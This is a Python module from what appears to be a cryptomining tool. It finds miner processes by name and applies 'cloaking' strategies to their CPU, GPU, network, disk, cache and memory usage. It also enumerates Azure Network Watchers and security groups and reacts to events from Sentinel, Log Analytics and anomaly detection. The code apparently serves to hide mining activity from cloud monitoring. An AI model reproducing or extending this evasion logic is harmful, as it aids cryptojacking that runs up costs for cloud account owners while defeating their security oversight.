# resource_manager.py

import os
import logging
import psutil
import pynvml
import traceback
import asyncio
from asyncio import Queue as AsyncQueue
from typing import List, Any, Dict, Optional, Tuple
from itertools import count
from contextlib import asynccontextmanager
from threading import Lock, Event

from readerwriterlock import rwlock

# Import các module phụ trợ từ dự án
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategyFactory
from .resource_control import ResourceControlFactory  # Import ResourceControlFactory

# Import Interface
from .interfaces import IResourceManager

# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    AzureAnomalyDetectorClient
    # AzureTrafficAnalyticsClient đã được loại bỏ
    # AzureOpenAIClient đã được loại bỏ
)

from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)

import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ


@asynccontextmanager
async def acquire_lock_with_timeout(lock: rwlock.RWLockFair, lock_type: str, timeout: float):
    """
    Async context manager để chiếm khóa với timeout.
    """
    if lock_type == 'read':
        acquired_lock = lock.gen_rlock()
    elif lock_type == 'write':
        acquired_lock = lock.gen_wlock()
    else:
        raise ValueError("lock_type phải là 'read' hoặc 'write'.")

    try:
        await asyncio.wait_for(acquired_lock.acquire(), timeout=timeout)
        try:
            yield acquired_lock
        finally:
            acquired_lock.release()
    except asyncio.TimeoutError:
        yield None


class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    Tích hợp chặt chẽ với ResourceControlFactory để quản lý các resource managers.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo SharedResourceManager với cấu hình và logger.
        """
        self.config = config
        self.logger = logger
        self.gpu_manager = GPUManager()
        self.power_manager = PowerManager()
        self.strategy_cache = {}  # Cache cho các chiến lược Cloak

        # Khởi tạo các resource managers thông qua ResourceControlFactory
        self.resource_managers = ResourceControlFactory.create_resource_managers(self.logger)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU đã được khởi tạo hay chưa.
        """
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    async def shutdown_nvml(self):
        """
        Đóng NVML khi không cần thiết (bất đồng bộ).
        """
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self.gpu_manager.shutdown_nvml)

    async def get_process_cache_usage(self, pid: int) -> float:
        """
        Lấy usage cache của tiến trình từ /proc/[pid]/status.
        """
        try:
            status_file = f"/proc/{pid}/status"
            async with aiofiles.open(status_file, 'r') as f:
                async for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])  # VmCache: 12345 kB
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
            return 0.0

    async def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID.
        """
        try:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, self._sync_get_gpu_usage_percent, pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """
        Phương thức đồng bộ để lấy GPU usage, được gọi từ async context.
        """
        try:
            pynvml.nvmlInit()
            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu
            pynvml.nvmlShutdown()

            if gpu_present:
                return total_gpu_usage
            else:
                return 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng một chiến lược cloaking cho tiến trình đã cho.
        """
        try:
            pid = process.pid
            name = process.name

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )

            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement 'apply'.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên cho tiến trình đã cloaked.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            for controller, manager in self.resource_managers.items():
                success = await asyncio.get_event_loop().run_in_executor(
                    None, manager.restore_resources, pid
                )
                if success:
                    self.logger.info(f"Đã khôi phục tài nguyên '{controller}' cho PID={pid}.")
                    restored = True
                else:
                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller}' cho PID={pid}.")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào để khôi phục cho {name} (PID: {pid}).")

        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục tài nguyên cho tiến trình {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise


# ------------------------ EVENT-DRIVEN PHẦN MỚI ------------------------ #
class ResourceEventType:
    CLOAKING = "cloaking"
    RESTORATION = "restoration"
    MONITORING_ADJUSTMENT = "monitoring_adjustment"

class ResourceEvent:
    """
    Định nghĩa một sự kiện tài nguyên.
    """
    def __init__(self, event_type: str, process: MiningProcess,
                 strategies: Optional[List[str]] = None,
                 adjustments: Optional[Dict[str, bool]] = None):
        self.event_type = event_type
        self.process = process
        self.strategies = strategies or []
        self.adjustments = adjustments or {}

class EventManager:
    """
    Quản lý Event Queue cho ResourceManager (Event-Driven Architecture).
    """
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        self.queue = AsyncQueue()
        self._stop_event = asyncio.Event()

    async def emit_event(self, event: ResourceEvent):
        """
        Phát ra một sự kiện vào queue.
        """
        await self.queue.put(event)
        self.logger.debug(f"[EventManager] Đã emit event {event.event_type} cho PID={event.process.pid}.")

    async def stop(self):
        self._stop_event.set()

    async def wait_for_event(self, timeout: float = 1.0) -> Optional[ResourceEvent]:
        """
        Chờ sự kiện từ queue (có timeout).
        """
        try:
            return await asyncio.wait_for(self.queue.get(), timeout=timeout)
        except asyncio.TimeoutError:
            return None


class ResourceManager(BaseManager, IResourceManager):
    """
    Lớp quản lý tài nguyên hệ thống, chịu trách nhiệm giám sát và điều chỉnh tài nguyên
    cho các tiến trình khai thác. (Singleton)
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        BaseManager.__init__(self, config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = Event()  # Dùng cho việc dừng ResourceManager
        self.resource_lock = rwlock.RWLockFair()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()

        # Khởi tạo các client Azure
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Khởi tạo SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger)

        # Khởi tạo EventManager (Event-Driven)
        self.event_manager = EventManager(logger)

        # Tạo task xử lý sự kiện
        loop = asyncio.get_event_loop()
        self.task_event_processor = loop.create_task(self.process_events())

    def initialize_azure_clients(self):
        """
        Khởi tạo các client Azure cần thiết.
        """
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)

    def discover_azure_resources(self):
        """
        Khám phá các tài nguyên Azure cần thiết.
        """
        try:
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    # ------------------- Các hàm phát sự kiện (thay cho polling cũ) ------------------- #
    async def emit_cloaking_event(self, process: MiningProcess):
        """
        Phát sự kiện CLOAKING cho một tiến trình.
        """
        try:
            strategies = ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
            event = ResourceEvent(
                ResourceEventType.CLOAKING,
                process,
                strategies=strategies
            )
            await self.event_manager.emit_event(event)
            self.logger.info(f"Đã emit CLOAKING event cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể emit cloaking event cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def emit_restoration_event(self, process: MiningProcess):
        """
        Phát sự kiện RESTORATION cho một tiến trình.
        """
        try:
            event = ResourceEvent(ResourceEventType.RESTORATION, process)
            await self.event_manager.emit_event(event)
            self.logger.info(f"Đã emit RESTORATION event cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể emit restoration event cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def emit_monitoring_adjustment_event(self, process: MiningProcess, adjustments: Dict[str, bool]):
        """
        Phát sự kiện MONITORING_ADJUSTMENT cho một tiến trình (được trigger từ anomaly).
        """
        try:
            event = ResourceEvent(ResourceEventType.MONITORING_ADJUSTMENT, process, adjustments=adjustments)
            await self.event_manager.emit_event(event)
            self.logger.info(f"Đã emit MONITORING_ADJUSTMENT event cho PID={process.pid}. Adjustments={adjustments}")
        except Exception as e:
            self.logger.error(f"Không thể emit monitoring adjustment event cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    # ------------------- Xử lý sự kiện ------------------- #
    
    async def process_events(self):
        """
        Lắng nghe và xử lý event từ EventManager (Event-Driven).
        """
        self.logger.info("Bắt đầu process_events (event-driven) cho ResourceManager.")
        while not self.stop_event.is_set():
            try:
                event = await self.event_manager.wait_for_event(timeout=1.0)
                if event is None:
                    # Không có event => lặp lại
                    continue

                if event.event_type == ResourceEventType.CLOAKING:
                    # Áp dụng tất cả các chiến lược cloaking
                    for strategy in event.strategies:
                        if strategy not in self.shared_resource_manager.strategy_cache:
                            strategy_instance = CloakStrategyFactory.create_strategy(
                                strategy,
                                self.config,
                                self.logger,
                                self.shared_resource_manager.resource_managers
                            )
                            self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                        else:
                            strategy_instance = self.shared_resource_manager.strategy_cache[strategy]

                        if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
                            self.logger.info(f"[Event:CLOAKING] Áp dụng '{strategy}' cho PID={event.process.pid}")
                            strategy_instance.apply(event.process)
                        else:
                            self.logger.error(f"[Event:CLOAKING] Không thể áp dụng '{strategy}' cho PID={event.process.pid}")

                elif event.event_type == ResourceEventType.RESTORATION:
                    # Khôi phục tài nguyên
                    await self.shared_resource_manager.restore_resources(event.process)

                elif event.event_type == ResourceEventType.MONITORING_ADJUSTMENT:
                    # Xử lý kết quả điều chỉnh do anomaly (nhiệt độ, power…)
                    adjustments = event.adjustments
                    if adjustments.get('cpu_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('cpu', event.process)
                    if adjustments.get('gpu_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('gpu', event.process)
                    if adjustments.get('network_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('network', event.process)
                    if adjustments.get('io_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('disk_io', event.process)
                    if adjustments.get('cache_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('cache', event.process)
                    if adjustments.get('memory_cloak'):
                        self.shared_resource_manager.apply_cloak_strategy('memory', event.process)

                self.event_manager.queue.task_done()

            except Exception as e:
                self.logger.error(f"Lỗi trong process_events: {e}\n{traceback.format_exc()}")

        self.logger.info("Dừng process_events cho ResourceManager.")

    # ------------------- Thu thập & tiện ích ------------------- #
    async def discover_mining_processes_async(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                if write_lock is None:
                    self.logger.error("Failed to acquire mining_processes_lock trong discover_mining_processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.get('network_interface', 'eth0')
                            mining_proc = MiningProcess(
                                proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                            )
                            self.mining_processes.append(mining_proc)
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.
        """
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải là int => gán 1."
            )
            return 1
        return pri_val

    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics cho một tiến trình cụ thể.
        """
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)
            
            if self.shared_resource_manager.is_gpu_initialized():
                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
            else:
                gpu_pct = 0.0
            
            disk_mbps = await asyncio.get_event_loop().run_in_executor(
                None, temperature_monitor.get_current_disk_io_limit, process.pid
            )
            net_bw = float(self.config.get('resource_allocation', {})
                                     .get('network', {})
                                     .get('bandwidth_limit_mbps', 100.0))

            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)

            if 'memory' in self.shared_resource_manager.resource_managers:
                memory_limit_mb = self.shared_resource_manager.resource_managers['memory'].get_memory_limit(process.pid)
                memory_limit_mb = memory_limit_mb / (1024**2)
            else:
                memory_limit_mb = 0.0

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': float(cache_l),
                'memory_limit_mb': float(memory_limit_mb)
            }

            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
            if invalid_metrics:
                self.logger.error(
                    f"Metrics cho PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                )
                return {}

            self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
            return metrics

        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại khi thu thập metrics.")
            return {}
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    async def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập toàn bộ metrics cho tất cả các tiến trình khai thác.
        """
        metrics_data = {}
        try:
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
                if read_lock is None:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
                    return metrics_data

                tasks = []
                for proc in self.mining_processes:
                    task = self.collect_metrics(proc)
                    tasks.append(task)

                results = await asyncio.gather(*tasks)

                for proc, metrics in zip(self.mining_processes, results):
                    if not isinstance(metrics, dict):
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} không phải là dict. Dữ liệu: {metrics}"
                        )
                        continue
                    invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
                    if invalid_metrics:
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                        )
                        continue
                    metrics_data[str(proc.pid)] = metrics
                self.logger.debug(f"Collected metrics data: {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    async def shutdown(self):
        """
        Dừng ResourceManager, bao gồm việc dừng tasks và khôi phục tài nguyên (nếu cần).
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        # Dừng task xử lý event
        self.task_event_processor.cancel()

        # Chờ các task hoàn thành
        await asyncio.sleep(0.5)
        await self.shared_resource_manager.shutdown_nvml()

        # Khôi phục tài nguyên cho các tiến trình
        tasks = []
        for proc in self.mining_processes:
            task = self.shared_resource_manager.restore_resources(proc)
            tasks.append(task)
        await asyncio.gather(*tasks)

        self.logger.info("ResourceManager đã dừng.")
        shutdown_power_management()  # Tắt power_management nếu cần
